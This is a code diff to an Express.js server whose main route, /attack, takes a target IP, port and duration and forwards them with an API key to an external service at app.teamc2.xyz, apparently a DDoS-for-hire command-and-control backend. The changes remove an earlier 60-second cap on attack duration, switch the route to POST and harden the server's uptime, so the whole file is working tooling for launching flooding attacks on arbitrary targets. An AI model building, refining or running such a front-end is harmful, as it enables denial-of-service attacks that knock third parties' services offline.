@@ -11,67 +11,83 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
+// ENV
 const API_KEY = process.env.API_KEY;
-const PORT = process.env.PORT;
+const PORT = process.env.PORT || 5000;
 
-// safety checks
 if (!PORT) {
   console.error("FATAL: PORT not provided");
   process.exit(1);
 }
 
-if (!API_KEY) {
-  console.error("FATAL: API_KEY missing");
-  process.exit(1);
-}
+console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
+console.log("Binding PORT:", PORT);
 
-// health
-app.get("/", (req, res) => {
-  res.send("API Running ✅");
+// Global error handlers
+process.on("uncaughtException", (err) => {
+  console.error("UNCAUGHT ERROR:", err);
 });
 
-// 🔥 FINAL ROUTE
-app.get("/attack", async (req, res) => {
-  try {
-    const { ip, port, time } = req.query;
+process.on("unhandledRejection", (err) => {
+  console.error("UNHANDLED PROMISE:", err);
+});
 
-    // basic validation
+// Health routes
+app.get("/", (req, res) => res.status(200).send("OK"));
+app.get("/health", (req, res) => res.status(200).send("OK"));
+app.get("/test", (req, res) => res.json({ msg: "Test OK" }));
+
+// Main API
+app.post("/attack", async (req, res) => {
+  try {
+    let { ip, port, time } = req.body;
+
+    // 🔒 Basic validation
     if (!ip || !port || !time) {
       return res.status(400).json({ error: "Missing params" });
     }
 
-    // limits
-    if (time > 60) {
-      return res.status(400).json({ error: "Max time 60s" });
+    port = Number(port);
+    time = Number(time);
+
+    if (isNaN(port) || isNaN(time)) {
+      return res.status(400).json({ error: "Invalid port/time" });
     }
 
-    // external API call
-    const url = `https://app.teamc2.xyz/api/attack`;
+    if (!API_KEY) {
+      return res.status(500).json({ error: "API key missing" });
+    }
+
+    const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;
 
     const response = await axios.get(url, {
-      params: {
-        api_key: API_KEY,
-        target: ip,
-        port: port,
-        time: time,
-        concurrent: 1,
-      },
-      timeout: 10000,
+      timeout: 15000,
     });
 
-    res.json(response.data);
+    return res.json({
+      success: true,
+      data: response.data, // ✅ actual API response
+    });
 
   } catch (err) {
-    console.error("ERROR:", err.message);
-    res.status(500).json({ error: "Failed" });
+    console.error("ERROR:", err?.response?.data || err.message);
+
+    return res.status(500).json({
+      error: err?.response?.data || "Server error",
+    });
   }
 });
 
-// 404
-app.use((req, res) => {
-  res.status(404).json({ error: "Route not found" });
+// Start server
+const server = app.listen(PORT, "0.0.0.0", () => {
+  console.log(`Servers running on port ${PORT}`);
 });
 
-app.listen(PORT, "0.0.0.0", () => {
-  console.log(`Server running on port ${PORT}`);
+// Graceful shutdown
+process.on("SIGTERM", () => {
+  console.log("SIGTERM received. Shutting down...");
+  server.close(() => {
+    console.log("Server closed");
+    process.exit(0);
+  });
 });
